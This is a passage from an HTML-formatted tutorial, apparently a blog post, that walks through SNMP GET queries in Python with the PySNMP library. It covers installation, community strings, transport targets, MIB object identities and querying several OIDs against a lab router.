    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;oid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prettyPrint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prettyPrint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When the above code is ran, the following is the output that we get:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;varBinds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;     &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;{} = {}&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;oid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prettyPrint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prettyPrint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()))&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;SNMPv2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MIB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sysName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Router1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lab&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;yaklin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ca&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To summarize what happened from a high-level:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;All necessary modules were imported to build an SNMP query&lt;/li&gt;
  &lt;li&gt;An iterator was created which associates the various components of the SNMP query&lt;/li&gt;
  &lt;li&gt;The query is sent to the router by referring to the iterator with next() and the resulting response and any errors are stored across four variables&lt;/li&gt;
  &lt;li&gt;Checks are performed to see if any errors were picked up&lt;/li&gt;
  &lt;li&gt;The returned value for sysName is printed to screen&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The remaining sections of this article will explain each of these points in further detail.&lt;/p&gt;

&lt;h2 id=&quot;installing-pysnmp&quot;&gt;Installing PySNMP&lt;/h2&gt;

&lt;p&gt;PySNMP runs with Python 2.4 through 3.7 according to the documentation, but I have been able to use its hlapi with Python 3.9.4. This doesn’t guarantee that it will be stable with anything higher than 3.7.&lt;/p&gt;

&lt;p&gt;To install PySNMP to work with Python 3.9.4, use:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 -m pip install pysnmp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p class=&quot;notice--warning&quot;&gt;It should be pointed out that the PySNMP packages latest release of 4.4.12 was last released on Sept 24, 2019 as seen on &lt;a href=&quot;https://github.com/etingof/pysnmp&quot;&gt;Github&lt;/a&gt;. The &lt;a href=&quot;https://pysnmp.readthedocs.io/en/latest/&quot;&gt;PySNMP&lt;/a&gt; site itself has a disclaimer right at the top that the documentation is an inofficial copy. Although it has not been updated in quite some time, it still appears to be effective for performing SNMP queries with Python.&lt;/p&gt;

&lt;h2 id=&quot;pysnmp-modules-for-a-simple-snmp-get&quot;&gt;PySNMP Modules for a Simple SNMP GET&lt;/h2&gt;

&lt;h3 id=&quot;importing-the-necessary-components&quot;&gt;Importing the necessary components&lt;/h3&gt;

&lt;p&gt;Once you have PySNMP installed its time to import the various modules. The quick start tutorial uses &lt;a href=&quot;https://www.python.org/dev/peps/pep-0008/#imports&quot;&gt;wildcard imports&lt;/a&gt; as follows:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pysnmp.hlapi&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The above method is discouraged in the PEP8 style guide for all the reasons mentioned in the link and as a result I import each module by name so as to avoid confusion. This makes it obvious when reviewing code as to where names are coming from:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pysnmp.hlapi&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SnmpEngine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CommunityData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UdpTransportTarget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;\
                         &lt;span class=&quot;n&quot;&gt;ContextData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ObjectType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ObjectIdentity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getCmd&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;snmpengine-and-contextdata&quot;&gt;SnmpEngine() and ContextData()&lt;/h3&gt;

&lt;p&gt;The &lt;a href=&quot;https://pysnmp.readthedocs.io/en/latest/docs/api-reference.html#high-level-v3arch-snmp-engine&quot;&gt;SnmpEngine()&lt;/a&gt; class creates an SNMP engine object which helps to maintain state information associated with the SNMP query. &lt;a href=&quot;https://pysnmp.readthedocs.io/en/latest/docs/api-reference.html#high-level-v3arch-snmp-context&quot;&gt;ContextData()&lt;/a&gt; is described by PySNMP as &lt;em&gt;Creates UDP/IPv6 configuration entry and initialize socket API if needed&lt;/em&gt; and also assists in forming SNMP PDU’s.&lt;/p&gt;

&lt;p&gt;There are multiple parameters that can be passed to both SnmpEngine() and ContextData(), but they are not necessary for our purpuses and so won’t be discussed further. Just know that you need to provide them to getCmd() without any parameters as shown in the example code above.&lt;/p&gt;

&lt;h3 id=&quot;communitydata&quot;&gt;CommunityData()&lt;/h3&gt;

&lt;p&gt;To provide SNMPv1 or v2 community strings to PySNMP we form an instance of PySNMP’s &lt;a href=&quot;https://pysnmp.readthedocs.io/en/latest/docs/api-reference.html#community-based&quot;&gt;CommunityData()&lt;/a&gt; class and pass it our community string and if we’re using SNMP v1 or v2c:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;CommunityData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;rostring&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mpModel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In this case, ‘rostring’ is the community string and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mpModel=1&lt;/code&gt; indicates SNMPv2c (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mpModel=0&lt;/code&gt; would be for SNMPv1).&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Check out the &lt;a href=&quot;https://pysnmp.readthedocs.io/en/latest/docs/api-reference.html#user-based&quot;&gt;UsmUserData()&lt;/a&gt; class to learn more about using SNMPv3&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;udptransporttarget&quot;&gt;UdpTransportTarget()&lt;/h3&gt;

&lt;p&gt;To define which host you want to query via SNMP you use &lt;a href=&quot;https://pysnmp.readthedocs.io/en/latest/docs/api-reference.html#transport-configuration&quot;&gt;UdpTransportTarget()&lt;/a&gt;. The first, and only required, parameter of this method is a tuple representing the hostname or IP address and the UDP port as an integer:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;UdpTransportTarget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;192.168.11.201&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;161&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A few additional parameters can be provided as well, if you need to control timeout intervals and retries. If not provided, a timeout of 1 second and 5 retries are the default values, but to adjust them the UdpTransportTarget() can be set as follows&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;UdpTransportTarget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;192.168.11.201&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;161&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;retries&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;objecttype-and-objectidentity&quot;&gt;ObjectType() and ObjectIdentity()&lt;/h3&gt;

&lt;p&gt;The combination of an &lt;a href=&quot;https://pysnmp.readthedocs.io/en/latest/docs/api-reference.html#pysnmp.smi.rfc1902.ObjectType&quot;&gt;ObjectType()&lt;/a&gt; encapsulating an &lt;a href=&quot;https://pysnmp.readthedocs.io/en/latest/docs/api-reference.html#mib-variables&quot;&gt;ObjectIdentity()&lt;/a&gt; defines which SNMP MIB variable we are going to query on the remote device. In this example sysName is being queried and is represented as follows:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;ObjectIdentity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;SNMPv2-MIB&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;sysName&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Starting with ObjectIdentity() we can see that our example takes three prameters:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The MIB name, in this case SNMPv2-MIB&lt;/li&gt;
  &lt;li&gt;The MIB variable, in this case sysName&lt;/li&gt;
  &lt;li&gt;The instance of the MIB variable, which is 0 in our case for sysName&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The combination of the three of these parameters represents the entire MIB variable ID of SNMPv2-MIB::sysName.0, or its OID of 1.3.6.1.2.1.1.5.0.&lt;/p&gt;

&lt;p&gt;Note that when using the the method shown in our example, which makes for a more human-readable variable, is only possible if you the MIB object you are querying is part of a MIB pre-compiled into PySNMP’s format using PySMI. PySNMP ships with several common MIB’s compiled in the format you may need, but if you are needing to query a MIB object that isn’t compiled you can specify it using the integers representing the OID either as a string or as a tuple of integers.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;ObjectIdentity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;1.3.6.1.2.1.1.5.0&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;ObjectIdentity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p class=&quot;notice--info&quot;&gt;If you don’t have a compiled MIB for the OID that you are querying, the output of the ObjectIdentity on the returned value will be the OID instead of a human-readable value. See the section below on compiled MIB’s with PySNMP.&lt;/p&gt;

&lt;p&gt;ObjectType() encapsulates our ObjectIdentity() into a container which we can use with various SNMP commands. In this instance the only parameter that we provide to ObjectType is our ObjectIdentity():&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;ObjectType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectIdentity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;SNMPv2-MIB&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;sysName&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;initiating-a-query-with-getcmd&quot;&gt;Initiating a Query with getCmd()&lt;/h2&gt;

&lt;p&gt;To send an SNMP GET to a device we will be using &lt;a href=&quot;https://pysnmp.readthedocs.io/en/latest/docs/hlapi/v3arch/asyncore/sync/manager/cmdgen/getcmd.html&quot;&gt;getCmd()&lt;/a&gt;. This creates a &lt;a href=&quot;https://realpython.com/introduction-to-python-generators/&quot;&gt;Python generator&lt;/a&gt; which creates an iterable object much &lt;em&gt;like&lt;/em&gt; a list.&lt;/p&gt;

&lt;p&gt;getCmd() requires a minimum of five paramters passed to it (each of these will be explained in further detail in the sections below):&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;An SNMP engine using SnmpEngine()&lt;/li&gt;
  &lt;li&gt;An SNMP community string using CommunityData(), or SNMP v3 credentials with UsmUserData()&lt;/li&gt;
  &lt;li&gt;A transport target, in this example we use an IPv4 so UdpTransportTarget()&lt;/li&gt;
  &lt;li&gt;A UDP context using ContextData()&lt;/li&gt;
  &lt;li&gt;One &lt;em&gt;or more&lt;/em&gt; SNMP ObjectType() classes representing MIB variables (in our case sysName)&lt;/li&gt;
  &lt;li&gt;Any optional parameters lookupMib&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;By combining all of these elements with getCmd() we assign the resulting iterable object to a variable which we call &lt;em&gt;iterator&lt;/em&gt; in our case:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;iterator&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getCmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SnmpEngine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;CommunityData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;rostring&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mpModel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;UdpTransportTarget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;192.168.11.201&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;161&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ContextData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ObjectType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectIdentity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;SNMPv2-MIB&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;sysName&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The above Python statement doesn’t actually initiate any network traffic. No SNMP query has been snet to our device yet. Instead, it simply creates an iterable object by using a Python generator and in our case actions are only taken once we iterate over this object.&lt;/p&gt;

&lt;p&gt;To iterate over each sequential element in this iterator object we call it using Python’s built-in next() function on it (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next(iterator)&lt;/code&gt;). In this example there will only be a single element in this iterable because we only have a single MIB object of sysName, so next() is only called a single time as follows:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;errorIndication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errorStatus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errorIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;varBinds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iterator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;By accessing the next available element in the iterator, the getCmd() iterator returns four values:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;errorIndication - A string that when present indicates an SNMP error, along with the provided text of the error&lt;/li&gt;
  &lt;li&gt;errorStatus - A string that when present indicates an SNMP PDU error&lt;/li&gt;
  &lt;li&gt;errorIndex - The index in varBinds that generated the error&lt;/li&gt;
  &lt;li&gt;varBinds - A sequence of MIB variable values returned via SNMP. These are &lt;a href=&quot;https://pysnmp.readthedocs.io/en/latest/docs/api-reference.html#pysnmp.smi.rfc1902.ObjectType&quot;&gt;PySNMP ObjectType&lt;/a&gt; class instances&lt;/li&gt;
&lt;/ul&gt;

&lt;p class=&quot;notice--info&quot;&gt;PySNMP supports other SNMP commands, such as bulkCmd(), nextCmd(), and setCmd(), by using the same generator/iterable approach.&lt;/p&gt;

&lt;h2 id=&quot;querying-multiple-snmp-oids&quot;&gt;Querying Multiple SNMP OID’s&lt;/h2&gt;

&lt;p&gt;As mentioned in the getCmd() section above, getCmd() is able to take a variable number of ObjectType’s so as to facilitate querying multiple OID’s. The below example queries for both sysName and sysDescr:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;iterator&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getCmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SnmpEngine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;CommunityData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;rostring&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mpModel&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;UdpTransportTarget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;192.168.11.201&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;161&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ContextData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ObjectType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectIdentity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;SNMPv2-MIB&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;sysName&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ObjectType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectIdentity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;SNMPv2-MIB&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;sysDescr&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;errorIndication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errorStatus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errorIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;varBinds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iterator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If both MIB objects are available on the remote system, varBinds will have two elements (one for each OID). In this particular case we don’t need to use next() twice, as both OID’s are provided to the iterator at the same time. The values of each element can be seen as follows:&lt;/p&gt;

